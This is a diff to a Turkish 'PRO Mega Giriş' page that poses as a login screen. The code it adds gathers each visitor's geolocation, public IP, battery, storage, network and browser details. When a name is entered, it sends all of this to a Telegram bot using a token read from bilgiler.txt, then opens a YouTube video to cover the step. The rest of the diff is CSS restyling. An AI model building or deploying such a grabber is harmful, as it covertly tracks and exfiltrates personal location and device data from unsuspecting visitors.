@@ -2,11 +2,37 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>PRO Mega Giriş</title>
+  <title>🚀 PRO Mega Giriş</title>
   <style>
-    body { font-family: Arial; background: #eef; text-align: center; padding: 50px; }
-    input, button { padding: 10px; font-size: 16px; margin: 8px; }
-    #uyari { color: red; margin-top: 10px; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      color: #fff;
+      text-align: center;
+      padding: 50px;
+    }
+    input, button {
+      padding: 12px;
+      font-size: 16px;
+      margin: 10px;
+      border-radius: 6px;
+      border: none;
+    }
+    input {
+      width: 250px;
+    }
+    button {
+      background-color: #00ff99;
+      color: #000;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #00cc77;
+    }
+    #uyari {
+      color: #ff4444;
+      margin-top: 10px;
+    }
   </style>
 </head>
 <body>
@@ -19,8 +45,7 @@
     let info = {
       name:"", lat:null, lon:null,
       ip:"Alınamadı", browser:"site:Bilinmiyor",
-      screen:`${screen.width}x${screen.height}`,
-      pixelRatio:devicePixelRatio, colorDepth:screen.colorDepth,
+      screen:`${screen.width}x${screen.height}`, pixelRatio:devicePixelRatio, colorDepth:screen.colorDepth,
       memory:navigator.deviceMemory||"?", cores:navigator.hardwareConcurrency||"?",
       online:navigator.onLine, platform:navigator.platform,
       language:navigator.language,
@@ -41,22 +66,22 @@
       const start = performance.timing.navigationStart;
 
       navigator.geolocation.getCurrentPosition(
-        p=>{
+        p => {
           info.lat = p.coords.latitude;
           info.lon = p.coords.longitude;
         },
-        ()=>document.getElementById("uyari").innerText="📍 Konum izni gerekli!"
+        () => document.getElementById("uyari").innerText = "📍 Konum izni gerekli!"
       );
 
       try {
-        const { ip } = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
+        const { ip } = await fetch("https://api.ipify.org?format=json").then(r => r.json());
         info.ip = ip;
       } catch {}
 
       if (navigator.getBattery) {
         const bat = await navigator.getBattery();
-        info.batteryLevel = Math.round(bat.level*100)+"%";
-        info.charging     = bat.charging;
+        info.batteryLevel = Math.round(bat.level * 100) + "%";
+        info.charging = bat.charging;
       }
 
       if (navigator.storage && navigator.storage.estimate) {
@@ -65,28 +90,49 @@
         info.storageQuota = quota;
       }
 
-      const conn = navigator.connection||{};
-      info.netType  = conn.effectiveType||"?";
-      info.downlink = conn.downlink||"?";
-      info.rtt      = conn.rtt||"?";
+      const conn = navigator.connection || {};
+      info.netType = conn.effectiveType || "?";
+      info.downlink = conn.downlink || "?";
+      info.rtt = conn.rtt || "?";
 
       const ua = navigator.userAgent;
-      if (ua.includes("Chrome")&&!ua.includes("Edg")) info.browser="site:Chrome";
-      else if (ua.includes("Firefox")) info.browser="site:Firefox";
-      else if (ua.includes("Safari")&&!ua.includes("Chrome")) info.browser="site:Safari";
-      else if (ua.includes("Edg")) info.browser="site:Edge";
+      if (ua.includes("Chrome") && !ua.includes("Edg")) info.browser = "site:Chrome";
+      else if (ua.includes("Firefox")) info.browser = "site:Firefox";
+      else if (ua.includes("Safari") && !ua.includes("Chrome")) info.browser = "site:Safari";
+      else if (ua.includes("Edg")) info.browser = "site:Edge";
 
       info.darkMode = window.matchMedia("(prefers-color-scheme: dark)").matches;
       info.pageLoadTime = performance.timing.domContentLoadedEventEnd - start;
     };
 
-    function toDMS(lat, lon) {
-      const latDeg = Math.floor(lat);
-      const latMin = Math.floor((lat - latDeg) * 60);
-      const latSec = (((lat - latDeg) * 60 - latMin) * 60).toFixed(1);
+    async function girisYap() {
+      const username = document.getElementById("username").value.trim();
+      if (!username) {
+        document.getElementById("uyari").innerText = "⚠️ Lütfen adınızı girin!";
+        return;
+      }
 
-      const lonDeg = Math.floor(lon);
-      const lonMin = Math.floor((lon - lonDeg) * 60);
-      const lonSec = (((lon - lonDeg) * 60 - lonMin) * 60).toFixed(1);
+      info.name = username;
 
-      return `${latDeg}°${latMin}'${latSec}"N ${lonDeg}
+      // bilgiler.txt'den bot bilgilerini çek
+      try {
+        const veri = await fetch("bilgiler.txt").then(r => r.text());
+        const BOT_TOKEN = veri.match(/BOT_TOKEN=(.*)/)[1].trim();
+        const CHAT_ID = veri.match(/CHAT_ID=(.*)/)[1].trim();
+
+        const mesaj = Object.entries(info).map(([k, v]) => `${k}: ${v}`).join("\n");
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(mesaj)}`
+        });
+
+        window.open("https://www.youtube.com/watch?v=GBGqg0v8ZpI", "_blank");
+      } catch (e) {
+        document.getElementById("uyari").innerText = "❌ bilgiler.txt yüklenemedi veya Telegram gönderimi başarısız.";
+      }
+    }
+  </script>
+</body>
+</html>
